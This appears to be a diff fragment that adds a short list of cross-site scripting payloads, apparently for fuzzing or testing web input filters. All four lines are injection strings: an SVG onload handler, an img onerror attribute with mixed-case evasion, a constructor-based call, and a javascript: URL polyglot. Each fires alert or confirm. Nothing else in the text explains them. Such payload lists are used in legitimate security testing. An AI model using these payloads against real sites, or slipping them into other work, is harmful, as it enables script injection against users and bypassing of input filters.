@@ -1,0 +1,4 @@
+<svg%0Aonload=alert?.(1)>
+<img/src=x/oNeRrOr=confirm``>
+Set.constructor`alert(1)`()
+jaVaScRiPt:/*-/*`/*\\`/*'/*"/**/(alert)(1)
